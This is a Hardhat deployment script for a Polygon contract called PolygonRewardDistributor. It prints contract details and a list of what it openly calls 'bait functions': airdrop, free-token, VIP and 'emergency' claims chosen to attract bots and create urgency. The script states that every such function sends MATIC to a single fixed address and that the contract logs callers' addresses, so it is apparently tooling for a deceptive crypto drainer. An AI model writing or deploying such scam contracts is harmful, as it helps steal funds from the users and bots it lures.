const { ethers } = require("hardhat");

async function main() {
  console.log("Deploying PolygonRewardDistributor contract...");
  
  // Get the deployer account
  const [deployer] = await ethers.getSigners();
  console.log("Deploying contracts with the account:", deployer.address);
  
  // Get account balance
  const balance = await ethers.provider.getBalance(deployer.address);
  console.log("Account balance:", ethers.formatEther(balance), "MATIC");
  
  // Get the contract factory
  const PolygonRewardDistributor = await ethers.getContractFactory("PolygonRewardDistributor");
  
  // Deploy the contract
  console.log("Deploying contract...");
  const rewardDistributor = await PolygonRewardDistributor.deploy();
  
  // Wait for deployment
  await rewardDistributor.waitForDeployment();
  
  const contractAddress = await rewardDistributor.getAddress();
  console.log("PolygonRewardDistributor deployed to:", contractAddress);
  console.log("Contract admin:", await rewardDistributor.getSystemAdmin());
  console.log("Participation fee:", ethers.formatEther(await rewardDistributor.getParticipationFee()), "MATIC");
  
  // Display contract info
  console.log("\n=== Contract Information ===");
  console.log("Name:", await rewardDistributor.name());
  console.log("Symbol:", await rewardDistributor.symbol());
  console.log("Decimals:", await rewardDistributor.decimals());
  console.log("Total Supply:", ethers.formatEther(await rewardDistributor.totalSupply()));
  console.log("Remaining Distribution:", ethers.formatEther(await rewardDistributor.getRemainingDistribution()));
  console.log("Total Participants:", await rewardDistributor.getTotalParticipants());
  
  // Test some sample balances
  console.log("\n=== Sample Balances ===");
  console.log("Admin Balance:", ethers.formatEther(await rewardDistributor.balanceOf(deployer.address)));
  console.log("Random Address Balance:", ethers.formatEther(await rewardDistributor.balanceOf("0x742D35cc6634C0532925a3B8d4Cf0e1A4e2c6789")));
  
  // Verify contract on Polygonscan (if API key is provided)
  if (process.env.POLYGONSCAN_API_KEY && hre.network.name !== "hardhat") {
    console.log("\nVerifying contract on Polygonscan...");
    try {
      await hre.run("verify:verify", {
        address: contractAddress,
        constructorArguments: [],
      });
      console.log("Contract verified successfully!");
    } catch (error) {
      console.log("Verification failed:", error.message);
    }
  }
  
  console.log("\n=== Deployment Summary ===");
  console.log(`Contract Address: ${contractAddress}`);
  console.log(`Network: ${hre.network.name}`);
  console.log(`Deployer: ${deployer.address}`);
  console.log(`Transaction Hash: ${rewardDistributor.deploymentTransaction().hash}`);
  
  console.log("\n=== Available Bait Functions ===");
  console.log("- participateInDistribution() - Main participation function");
  console.log("- claimCommunityReward() - Community rewards");
  console.log("- claimAirdrop() - Most attractive to bots");
  console.log("- claimFreeTokens() - Free token appeal");
  console.log("- mintReward() - Minting terminology");
  console.log("- claimStakingRewards() - Staking rewards");
  console.log("- harvest() - DeFi harvest function");
  console.log("- claimBonus() - Bonus tokens");
  console.log("- withdraw() - Withdrawal function");
  console.log("- emergencyClaim() - Creates urgency");
  console.log("- redeemVoucher() - Voucher system");
  console.log("- collect() - Simple collection");
  console.log("- claimGovernance() - Governance tokens");
  console.log("- execute() - Simple execution");
  console.log("- instantClaim() - Instant processing");
  console.log("- fastClaim() - Fast track");
  console.log("- bulkClaim() - Bulk processing");
  console.log("- autoClaim() - Automated claiming");
  console.log("- premiumClaim() - Premium access");
  console.log("- vipClaim() - VIP exclusive");
  console.log("\n✓ All functions send MATIC to: 0x15E1A8454E2f31f64042EaE445Ec89266cb584bE");
  console.log("✓ Contract includes receive() and fallback() functions");
  console.log("✓ Comprehensive address logging and tracking");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Deployment failed:", error);
    process.exit(1);
  });
